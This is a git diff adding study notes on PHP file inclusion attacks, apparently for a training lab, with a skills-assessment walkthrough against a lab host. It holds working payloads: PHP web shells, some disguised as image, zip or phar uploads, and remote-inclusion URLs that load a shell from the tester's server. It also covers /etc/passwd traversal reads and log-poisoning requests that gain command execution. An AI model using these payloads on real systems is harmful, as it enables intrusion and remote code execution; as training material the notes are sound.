@@ -6,6 +6,11 @@
 1. [PHP Filters](#php-filters)
 1. [PHP Wrappers](#php-wrappers)
 1. [Remote File Inclusion](#remote-file-inclusion)
+1. [LFI & File Uploads](#lfi--file-uploads)
+1. [Log Poisoning](#log-poisoning)
+1. [Automated Scanning](#automated-scanning)
+1. [File Inclusion Prevention](#file-inclusion-prevention)
+1. [Skills Assessment](#skills-assessment)
 
 ## Intro to File Inclusions
 
@@ -171,7 +176,7 @@
   * Fuzz for available PHP pages using tools like ```ffuf``` or ```gobuster```:
 
     ```shell
-    ffuf - /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<server_ip>:<port>/FUZZ.php
+    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<server_ip>:<port>/FUZZ.php
     ```
 
   * We can read the source code of identified files, and scan them for other referenced PHP files as well.
@@ -252,3 +257,328 @@
     ```
 
 ## Remote File Inclusion
+
+* When a vulnerable function allows us to include remote files, we can host a malicious script & include it in the vulnerable page to execute functions & gain RCE.
+
+* Almost any RFI vulnerability is also an LFI vulnerability, but it is not the same the other way around.
+
+* Usually, remote URL inclusion is disabled by default - in PHP, ```allow_url_include``` (used in LFI) needs to be enabled for RFI.
+
+* But a more reliable way to verify RFI is to try & include URL - try local URL to ensure it does not get blocked by firewall:
+
+  ```http://<server_ip>:<port>/index.php?language=http://127.0.0.1:80/index.php```
+
+* RCE with RFI:
+
+  * Create malicious script in language of web app:
+
+    ```shell
+    echo '<?php system($_GET["cmd"]); ?>' > shell.php
+    ```
+
+  * Now we need to host this script & include it through RFI vulnerability - we can do it using HTTP (port 80/443 - can be whitelisted on firewall), FTP or SMB.
+
+  * HTTP:
+
+    ```shell
+    sudo python3 -m http.server 80
+    # whatever requests we send, we can view it here too
+    ```
+
+    ```http://<server_ip>:<port>/index.php?language=http://<our_ip>:80/shell.php&cmd=id```
+
+  * FTP:
+
+    ```shell
+    sudo python -m pyftpdlib -p 21
+    # starts ftp server, can be used if http:// string is blocked
+    
+    # by default, PHP tries to authenticate as anonymous user, but creds can be specified too
+    curl 'http://<server_ip>:<port>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+    ```
+
+    ```http://<server_ip>:<port>/index.php?language=ftp://<our_ip>/shell.php&cmd=id```
+
+  * SMB:
+
+    ```shell
+    # if webapp hosted on Windows server - check server version in HTTP response headers
+    # we do not need allow_url_include to be enabled, we can use SMB
+    impacket-smbserver -smb2support share $(pwd)
+    ```
+
+    ```http://<server_ip>:<port>/index.php?language=\\<our_ip>\share\shell.php&cmd=whoami```
+
+## LFI & File Uploads
+
+* Image upload:
+
+  * Here, the vulnerability exploited is the file inclusion functionality - code within uploaded file can get executed.
+
+  * Craft malicious image containing PHP web shell code - we can use any allowed image extension in file name, but it should include the image magic bytes at beginning of file content:
+
+    ```shell
+    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+    ```
+
+  * This file is harmless, until combined with an LFI vulnerability - to test this, we can upload the image on the vulnerable page.
+
+  * To include the uploaded file, we need to find the path to uploaded file - inspect source code, fuzz directories and fuzz for uploaded file; and once we have that we can include the file in the LFI function:
+
+    ```http://<server_ip>:<port>/index.php?language=./profile_images/shell.gif&cmd=id```
+
+* Zip upload:
+
+  * The ```zip://``` wrapper used to execute PHP code, if enabled, can be used for LFI - start by creating PHP web shell & zipping it into ```shell.jpg``` (lesser chance of working if zip upload is not allowed):
+
+    ```shell
+    echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+    ```
+  
+  * Once ```shell.jpg``` archive is uploaded, we can include it as ```zip://shell.jpg``` and refer to any files within it with ```#shell.php``` (URL-encoded):
+
+    ```http://<server_ip>:<port>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id```
+
+* Phar upload:
+
+  * ```phar://``` wrapper (for PHP archives) can be used similarly. First, create ```shell.php```:
+
+    ```php
+    <?php
+    $phar = new Phar('shell.phar');
+    $phar->startBuffering();
+    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+    $phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+    $phar->stopBuffering();
+    ```
+  
+  * Compile it into a ```phar``` file that, when called, would write web shell to ```shell.txt``` sub-file - we can compile & rename the ```phar``` file to ```shell.jpg```:
+  
+    ```shell
+    php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+    ```
+
+  * Once we upload the ```shell.jpg``` file, we can call it with ```phar://```, specify sub-file with ```/shell.txt``` (URL-encoded):
+
+    ```http://<server_ip>:<port>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id```
+
+## Log Poisoning
+
+* Involves writing PHP code in a field we control, that would get logged into a log file - this file can be included via LFI. But we need to have read privileges over logged files and any vulnerable functions with ```Execute``` priv.
+
+* PHP session poisoning:
+
+  * Most PHP webapps use ```PHPSESSID``` cookies, which hold user-related data on backend - stored in session files, on Linux in ```/var/lib/php/sessions/sess_<value of PHPSESSID>``` and on Windows in ```C:\Windows\Temp\sess_<value of PHPSESSID>```
+
+  * If we have the value of ```PHPSESSID``` cookie, we can try including the session file through LFI:
+
+    ```http://<server_ip>:<port>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID cookie value>```
+
+  * From the contents of the file, we can see that it contains two values - ```page``` & ```preference``` - here, the ```page``` parameter can be controlled by us
+
+  * Attempting to set value of ```page``` to a custom value and see if it changes in session file:
+
+    ```http://<server_ip>:<port>/index.php?language=session_poisoning```
+  
+  * If we include the session file through LFI again, we can see that the ```page``` parameter is updated now.
+
+  * Now, we can poison by writing PHP code to session file:
+
+    ```http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E```
+
+  * Finally, we can include session file and execute commands:
+
+    ```http://<server_ip>:<port>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID cookie value>&cmd=id```
+
+* Server log poisoning:
+
+  * ```Apache``` & ```Nginx``` both maintain log files like ```access.log``` & ```error.log``` - we can attempt to poison the server logs.
+
+  * Once poisoned, we need to include the logs through LFI, for which we need to have read-access over the logs too.
+
+  * The logs can be in different locations, so we can use a [LFI wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz.
+
+  * Attempting to include the Apache access log file from ```/var/log/apache2/access.log```:
+
+    ```http://<server_ip>:<port>/index.php?language=/var/log/apache2/access.log```
+
+  * The log contains remote IP address, request page, response code & User-Agent header - User-Agent header is controlled by us through HTTP request headers, so we can poison this.
+
+  * Using ```Burp Suite```, intercept the LFI request sent earlier & modify User-Agent header to "Apache Log Poisoning" (we can poison any other request as well).
+
+  * If the response includes the custom value, that means it works - now we can poison the User-Agent header value with basic PHP web shell; ```curl``` can be used as well for this:
+
+    ```shell
+    curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+    ```
+
+  * Now we can execute commands with LFI:
+
+    ```http://<server_ip>:<port>/index.php?language=/var/log/apache2/access.log&cmd=id```
+
+  * Other logs that could be poisoned with similar techniques include ```/var/log/sshd.log```, ```/var/log/mail```, ```/var/log/vsftpd.log```, etc.
+
+## Automated Scanning
+
+* Fuzzing parameters:
+
+  * We can fuzz the page for common ```GET``` parameters, for example:
+
+    ```shell
+    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+    ```
+  
+  * If we find an exposed parameter that is not linked to any forms tested, we can perform all LFI tests.
+
+* LFI wordlists:
+
+  * We can use ```LFI wordlists``` such as [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) to fuzz the parameter:
+
+    ```shell
+    ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+    ```
+  
+* Fuzzing server files:
+
+  * Server webroot:
+
+    * We may need to know full server webroot path to complete exploitation - we can fuzz for ```index.php``` through common webroot paths [for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) and [for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
+
+    * Depending on LFI, we may need to add a few back directories ```../../../``` and then add ```index.php```:
+
+      ```shell
+      ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+      ```
+
+  * Server logs/configs:
+
+    * We may need the server logs & configuration paths as well, which can be fuzzed using wordlists [for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) and [for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows); we can then attempt to read the logs based on the results we get from fuzzing:
+
+      ```shell
+      ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+
+      curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+      ```
+
+    * If the log file contains a global variable like ```APACHE_LOG_DIR```, we can read another file which stores its values, like ```/etc/apache2/envvars``` - this contains the path for ```access.log``` and ```error.log```.
+
+* LFI tools:
+
+  * For automation, we can use tools like [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy).
+
+## File Inclusion Prevention
+
+* File inclusion prevention:
+
+  * Avoid passing any user-controlled inputs into any file inclusion functions or APIs.
+
+  * Use a limited whitelist of allowed user inputs, and match each input to the file to be loaded & have a default value for all other inputs.
+
+* Preventing directory traversal:
+
+  * Use programming language's or framework's built-in tool to pull only filename.
+
+  * For custom functions, account for all edge cases, and sanitize user input to recursively remove any attempts of traversing directories.
+
+* Web server configuration:
+
+  * Disable unnecessary configurations.
+
+  * Lock web apps to their web root directory (can use Docker for this as well).
+
+* Web Application Firewall (WAF):
+
+  * Avoid false positives & block non-malicious requests.
+
+## Skills Assessment
+
+* Given the target, the vulnerable parameter 'page' is found.
+
+* Basic LFI does not work:
+
+  ```http://94.237.59.206:56260/index.php?page=/etc/passwd```
+
+* Path traversal gives the error 'invalid input detected':
+
+  ```http://94.237.59.206:56260/index.php?page=../../../../etc/passwd```
+
+* Filename prefix LFI also gives the same error:
+
+  ```http://94.237.59.206:56260/index.php?page=/../../../../etc/passwd```
+
+* Similarly, non-recursive path traversal & encoding techniques don't work as well.
+
+* Fuzzing for PHP files in web directory:
+
+  ```shell
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://94.237.59.206:56260/index.php?page=FUZZ.php" -fs 4322
+  # filter size can be found out by running this command without -fs flag
+  ```
+
+* Fuzzing for other parameters:
+
+  ```shell
+  ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "http://94.237.59.206:56260/index.php?FUZZ=value" -fs 15829
+  # gives only 'page' parameter
+  ```
+
+* Using LFI wordlists to scan:
+
+  ```shell
+  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u "http://94.237.59.206:56260/index.php?page=FUZZ" -fs 4322,4521
+  # no results
+  ```
+
+* We can notice that whatever file we're trying to include via LFI, the '.php' extension is added automatically.
+
+* Using PHP filters, we can try to read the source code of other files:
+
+  ```http://94.237.59.206:56260/index.php?page=php://filter/read=convert.base64-encode/resource=index```
+
+* We can read the source code given above by decoding from base64 - this contains a commented-out path 'ilf_admin/index.php' - it could be a page for Admin access.
+
+* This also contains the logic for the PHP code - we can go through that as well.
+
+* We can now visit the link at ```http://94.237.59.206:56260/ilf_admin/index.php``` - this gives us access to some logs.
+
+* This page uses the 'log' parameter - and reads the files 'chat.log', 'http.log' and 'system.log'.
+
+* We can again try fuzzing using LFI wordlists:
+
+  ```shell
+  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u "http://94.237.59.206:56260/ilf_admin/index.php?log=FUZZ" -fs 2046
+  ```
+
+* This gives us multiple results - we are able to read /etc/passwd now with the help of payloads like ```../../../../../../../../../etc/passwd``` - this shows that it is vulnerable to LFI.
+
+* We can try for log poisoning now, we but do not know if the server is using Apache2 or Nginx - so we need to fuzz here:
+
+  ```shell
+  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt:FUZZ -u "http://94.237.59.206:56260/ilf_admin/index.php?log=FUZZ" -fs 2046
+  # this does not work
+  # we can use the pattern we found with the payload
+
+  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt:FUZZ -u "http://94.237.59.206:56260/ilf_admin/index.php?log=../../../../../../../../../FUZZ" -fs 2046
+  # this gives us multiple results
+  ```
+
+* The above command shows that we can ```/var/log/nginx/access.log``` and ```/var/log/nginx/error.log```.
+
+* For log poisoning technique, using Burp Suite, we can capture a request and send it to Repeater:
+
+  ```http://94.237.59.206:56260/ilf_admin/index.php?log=../../../../../../../../../var/log/nginx/access.log```
+
+* Now, we can modify the 'User-Agent' header value to 'Log Poisoning', and send a request (sometimes, we need to send it again) - this is reflected in the response.
+
+* We can now change the 'User-Agent' value to basic PHP web shell and send the request:
+
+  ```php
+  <?php system($_GET['cmd']); ?>
+  ```
+
+* Once it is reflected, we get RCE - modify the URL in the GET request to the following:
+
+  ```/ilf_admin/index.php?log=../../../../../../../../../var/log/nginx/access.log&cmd=id```
+
+* This way, we can read the flag in the root directory.
